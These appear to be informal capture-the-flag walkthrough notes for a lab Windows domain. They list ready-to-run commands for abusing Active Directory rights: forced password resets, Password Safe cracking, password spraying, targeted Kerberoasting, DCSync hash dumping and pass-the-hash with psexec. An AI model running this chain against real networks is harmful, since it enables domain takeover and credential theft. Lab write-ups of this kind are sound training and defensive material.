we start with give creds, Olivia:ichliebedich
smb, ftp locked out for that user,
rpcclient gives a list of usernames, kerbrute to verify
kerberoast, asrep roast locked for rest of the users.
With nothing more to walk on, we go f bloodound
`bloodhound-ce-python -u 'olivia' -p 'ichliebedich' -ns 10.129.234.53 -d administrator.htb -c All --zip`
Open this with the new bloodhound, cuz the old one(in opt) dint show us the outbound connections, and that was the deciding factor for way forward
`sudo neo4j console` `sudo bloodhound --no-sandbox`
We click on out user Olivia, and find, on the "outboud connection", she has GenericFull over Michael.
GenericFull means, we can use net rpc to set them a new password.
The outbound connection for Michael showed, ForceChangePassword over Benjamin. Force Change Password explicitly means setting new password using rpc, or the secure string powershell
Looking at Benjamin, we see he is a member of the group "Share Moderators". Presumably, this means he has access to that FTP share that we found. So we begin chaining net rpc

`net rpc password 'Michael' 'newPassword' -U administrator.htb/'Olivia'%'ichliebedich' -S 10.129.234.53`
`net rpc password 'Benjamin' 'newPassword' -U administrator.htb/'Michael'%'newPassword' -S 10.129.234.53`
we verify the ftp suspicioun using nxc
`nxc ftp 10.129.234.53 -u 'Benjamin' -p 'newPassword'`

---
With this, we login to Benjamin's FTP share
`ftp 10.129.234.53`
`user Benjamin pass newPassword`
we see a Bacup.psafe3 file, which is a password-store db, and needs a master password to open. Time to crack it with john
`pwsafe2john Backup.psafe3`
`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
we get the password "tekieromucho"

`sudo apt install passwordsafe`
`psafe Backup.psafe3` and enter the master-password to open the password db
Copy the usernames into username.txt and passwords to passwords.txt
While the passwords might be available for each user, it is only a backup of the password database, and hence might have been changed.
So we'll spray using nxc
`nxc smb 10.129.234.53 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success`
`nxc winrm 10.129.234.53 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success`
Note - the --no-bruteforce flag matches the passwords 1 to 1 from user to password files

---
looking at bloodhound, emily has GenericWrite over Ethan, who has DCSync over the DC

To perform the GenericWrite, we look at "Linux Abuse" section, which asks us to use targetedKerberoast.py and shows a git repo.
We clone it and follow the syntax
`faketime "$(sudo ntpdate -q 10.129.233.208 | awk '{print $1 " " $2}')" python /opt/targetedKerberoast/targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'`

we get ethan's hash, crack it and get the password limpbizkit
we verify it using nxc smb
Since ethan has DcSync over the DC, we can just get everyone's ntlm hashes using impacket-secretsdump
`impacket-secretsdump administrator.htb/ethan@10.129.233.208`
3dc553ce4b9fd20bd016e098d2d2fd2e
psexec to pass the hash

impacket-psexec Administrator@10.129.233.208 -hashes 3dc553ce4b9fd20bd016e098d2d2fd2e:3dc553ce4b9fd20bd016e098d2d2fd2e